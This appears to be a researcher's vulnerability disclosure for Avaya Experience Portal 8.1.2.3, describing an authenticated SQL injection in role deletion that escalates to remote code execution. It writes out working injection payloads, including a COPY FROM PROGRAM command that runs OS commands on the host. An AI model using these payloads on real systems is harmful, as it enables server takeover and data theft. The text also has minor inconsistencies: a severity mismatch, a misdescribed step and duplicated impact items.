# SQLI-on-Avaya-Experience-Portal
Researcher Attribution: 

Lui Man Ho, Rex and Chan Shing Hei, Stanley

---
Summary:

A critical vulnerability was identified in Avaya Experience Portal version 8.1.2.3 where an authenticated user can perform a SQL Injection against the underlying PostgreSQL database. This vulnerability can be further escalated to achieve Remote Code Execution (RCE) on the host operating system, allowing for complete system takeover.

---
Vulnerable Version and Product:

Avaya Experience Portal version 8.1.2.3

--- 
Vulnerability information and Proof of Concept:
 
Vulnerability Authenticated PostgreSQL Injection to RCE in Avaya experience platform. 

CVSS: 8.4 (High) 

It was found that the User role > Delete function is vulnerable to SQL injection. Any admin user can add a new user and inject SQL statement within Role’s name. While delete function is triggered on the selected role, it was observed that the Avaya Experience portal the name parameter will be injected into the SQL statement and can lead to authenticated Remote Code execution on the Avaya Experience Portal hosting server. The following screenshot showed the synopsis of the SQL injection while delete injected ROLE with value “gli1lpc1 `z’z”${{%{{\”. 
<img width="1079" height="203" alt="image" src="https://github.com/user-attachments/assets/d5d2495c-c47a-4b40-abd8-74463852194f" />

---
Proof of Concept:

Pre-requisite: Admin user of Avaya Experience Portal.

Step 1. Create the following Role using the admin user.

';SELECT*INTO u FROM vproles--

';COPY u from E'\x2ftmp\x2fa' --

';COPY u FROM PROGRAM 'id' --
<img width="1259" height="328" alt="1" src="https://github.com/user-attachments/assets/5c0b85cd-ac35-4bb1-a4d5-e97941ca4438" />

Step 2. Select the injected Role and use the delete button. The following injected role will have the following effect:

';SELECT*INTO u FROM vproles—

Read the table vproles and put it into table u
<img width="1269" height="722" alt="2" src="https://github.com/user-attachments/assets/cc4afbbc-812b-4348-b277-1d96873b1383" />
Step 3. 

';COPY u from E'\x2ftmp\x2fa' –

Loads data into table u and put it into /tmp/a file
<img width="1378" height="626" alt="image (1)" src="https://github.com/user-attachments/assets/6520bfd6-2a77-4c0d-aa6b-a6aaace97a0c" />

Step 4.

';COPY u FROM PROGRAM 'id' –

Executes an operating system command on the database server, Captures the command’s stdout and Inserts that output into the table u. The error message reveal that the id command is executed.
<img width="1433" height="717" alt="5" src="https://github.com/user-attachments/assets/48c2db70-865f-4e25-975c-12ed4459744e" />

---
Impact

Severity: Critical

This vulnerability allows a logged-in user to bypass application logic and interact directly with the PostgreSQL database. Threat actor can execute arbitrary shell commands on the host server (RCE).
Specific Risks:

1.Host Compromise: Complete control over the underlying Ubuntu/Linux server.

2.Data Exfiltration: Access to all tables, including hashed passwords and configuration secrets.

3.Lateral Movement: The compromised host can be used as a pivot point to attack other internal Avaya infrastructure.

4.Persistence: An attacker could install a web shell or SSH backdoors to maintain access even after the session ends.

5.Lateral Movement: The compromised host can be used as a pivot point to attack other internal Avaya infrastructure.

6.Persistence: An attacker could install a web shell or SSH backdoors to maintain access even after the session ends.
